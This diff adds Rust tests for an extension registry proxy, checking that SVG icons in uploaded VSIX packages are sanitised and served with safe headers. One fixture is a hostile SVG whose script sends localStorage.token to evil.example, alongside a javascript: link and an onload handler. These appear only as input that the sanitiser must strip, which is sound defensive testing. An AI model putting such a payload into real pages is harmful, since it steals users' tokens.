@@ -527,6 +527,189 @@ async fn an_asset_type_the_extension_does_not_ship_is_a_404() {
     assert_eq!(status, 404);
 }
 
+// ── an SVG icon (RFC 0007-bis §11 q1) ────────────────────────────────────────
+
+/// A VSIX whose manifest names an SVG icon, carrying whatever `svg` is.
+///
+/// The manifest's `icon` field is what `resolve_asset_path` follows, so the file
+/// has to be named there and not merely be present in the archive.
+fn vsix_with_svg_icon(svg: &[u8]) -> Vec<u8> {
+    let manifest = json!({
+        "publisher": "acme",
+        "name": "tool",
+        "version": VERSION,
+        "displayName": "Acme Tool",
+        "icon": "icon.svg",
+        "engines": { "vscode": "^1.85.0" }
+    })
+    .to_string();
+
+    let mut buf = Vec::new();
+    {
+        let mut w = zip::ZipWriter::new(std::io::Cursor::new(&mut buf));
+        let opts: zip::write::FileOptions<'_, ()> =
+            zip::write::FileOptions::default().compression_method(zip::CompressionMethod::Stored);
+        for (name, body) in [
+            ("extension/package.json", manifest.as_bytes()),
+            ("extension/icon.svg", svg),
+        ] {
+            w.start_file(name, opts).unwrap();
+            w.write_all(body).unwrap();
+        }
+        w.finish().unwrap();
+    }
+    buf
+}
+
+async fn app_with_svg_icon(
+    svg: &[u8],
+) -> impl actix_web::dev::Service<
+    actix_http::Request,
+    Response = actix_web::dev::ServiceResponse<actix_web::body::BoxBody>,
+    Error = actix_web::Error,
+> {
+    let app = build_local_registry_app(
+        local_registry_app_parts("local-vsx", "openvsx", RegistryMode::Local, None),
+        batlehub_web::CargoIndexMap::default(),
+        None,
+    )
+    .await;
+    let req = TestRequest::put()
+        .uri(&format!("/proxy/local-vsx/{EXT}/{VERSION}/vsix"))
+        .insert_header(("Authorization", bearer(ADMIN_TOKEN)))
+        .insert_header(("Content-Type", "application/octet-stream"))
+        .set_payload(vsix_with_svg_icon(svg))
+        .to_request();
+    assert!(call_service(&app, req).await.status().is_success());
+    app
+}
+
+/// The icon renders, and what it carried does not.
+///
+/// Every SVG icon used to leave here as `application/octet-stream` — no icon in
+/// the editor, no icon in the console — because nothing in this crate could
+/// vouch for one. The README image proxy could, and RFC 0007-bis §11 q1 is the
+/// decision to share it rather than keep it a README's private arrangement.
+#[actix_web::test]
+async fn an_svg_icon_is_sanitised_and_served_as_an_image() {
+    let app = app_with_svg_icon(
+        br##"<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16">
+              <script>fetch('//evil.example/'+localStorage.token)</script>
+              <a href="javascript:alert(1)">a link a reader cannot inspect</a>
+              <circle cx="8" cy="8" r="7" fill="#09f"/>
+              <rect width="16" height="16" fill="#fff" onload="alert(1)"/>
+            </svg>"##,
+    )
+    .await;
+
+    let req = TestRequest::get()
+        .uri(&format!(
+            "/proxy/local-vsx/vscode/asset/acme/tool/{VERSION}/Microsoft.VisualStudio.Services.Icons.Default"
+        ))
+        .insert_header(("Authorization", bearer(ADMIN_TOKEN)))
+        .to_request();
+    let resp = call_service(&app, req).await;
+
+    assert_eq!(resp.status(), 200);
+    assert_eq!(
+        resp.headers().get("content-type").unwrap(),
+        "image/svg+xml",
+        "an icon the sanitiser vouched for is an image, not a download"
+    );
+    // The second of §7.2's two controls, and the one that holds even if the
+    // first is wrong. It has to be on the response, not merely on the middleware
+    // that would have supplied a policy for the whole `/proxy` prefix.
+    let csp = resp
+        .headers()
+        .get("content-security-policy")
+        .and_then(|v| v.to_str().ok())
+        .unwrap_or_default()
+        .to_owned();
+    assert!(csp.contains("sandbox"), "CSP was {csp}");
+
+    let body = String::from_utf8(read_body(resp).await.to_vec()).unwrap();
+    assert!(!body.contains("script"), "script survived: {body}");
+    assert!(
+        !body.contains("onload"),
+        "an event handler survived: {body}"
+    );
+    assert!(
+        !body.contains("javascript:"),
+        "a javascript: URL survived: {body}"
+    );
+    assert!(!body.contains("<a"), "a link survived: {body}");
+    assert!(
+        body.contains("<circle"),
+        "the drawing itself must survive: {body}"
+    );
+}
+
+/// The file routes hand back what the publisher shipped.
+///
+/// `serve_entry` backs three routes and only one of them advertises a file as
+/// an image: the gallery's `Icons.Default` asset. The other two — `vscode/unpkg`
+/// (`resourceUrlTemplate`, which is how a **web extension loads its own
+/// resources**) and OpenVSX's `…/file/{name}` — serve arbitrary files, and the
+/// sanitiser must not touch them. Its allow-list drops `use`, `symbol`, `style`
+/// and `filter`, so an extension shipping an icon sprite would be handed back a
+/// blank drawing by a route that is supposed to be a file server.
+///
+/// The same bytes, through both routes, is the assertion: the sprite survives
+/// on `unpkg` and is refused rendering as an image, while the icon asset in the
+/// test above is sanitised.
+#[actix_web::test]
+async fn a_file_route_serves_the_publishers_svg_unchanged() {
+    let sprite = br##"<svg xmlns="http://www.w3.org/2000/svg"><symbol id="a"><circle r="4"/></symbol><use href="#a"/></svg>"##;
+    let app = app_with_svg_icon(sprite).await;
+
+    let req = TestRequest::get()
+        .uri(&format!(
+            "/proxy/local-vsx/vscode/unpkg/acme/tool/{VERSION}/icon.svg"
+        ))
+        .insert_header(("Authorization", bearer(ADMIN_TOKEN)))
+        .to_request();
+    let resp = call_service(&app, req).await;
+
+    assert_eq!(resp.status(), 200);
+    assert_eq!(
+        resp.headers().get("content-type").unwrap(),
+        "application/octet-stream",
+        "a file route must not declare a publisher's SVG a renderable document"
+    );
+    assert_eq!(
+        read_body(resp).await,
+        sprite.as_slice(),
+        "the file route rewrote the publisher's bytes"
+    );
+}
+
+/// A document the sanitiser refuses stays the opaque download it always was.
+///
+/// Not a `404`: the bytes are the extension's and a client may still want them.
+/// What must not happen is a browser parsing them as a document from this
+/// origin, and the type is what stops that.
+#[actix_web::test]
+async fn an_svg_icon_the_sanitiser_refuses_stays_a_download() {
+    // Invalid UTF-8 rather than a stray tag: the reader validates the encoding
+    // and fails the whole document, which is the refusal this asserts. A merely
+    // untidy document is sanitised like any other.
+    let app = app_with_svg_icon(b"<svg><title>\xff\xfe</title></svg>").await;
+
+    let req = TestRequest::get()
+        .uri(&format!(
+            "/proxy/local-vsx/vscode/asset/acme/tool/{VERSION}/Microsoft.VisualStudio.Services.Icons.Default"
+        ))
+        .insert_header(("Authorization", bearer(ADMIN_TOKEN)))
+        .to_request();
+    let resp = call_service(&app, req).await;
+
+    assert_eq!(resp.status(), 200);
+    assert_eq!(
+        resp.headers().get("content-type").unwrap(),
+        "application/octet-stream"
+    );
+}
+
 #[actix_web::test]
 async fn vspackage_serves_the_package() {
     let app = gallery_app().await;
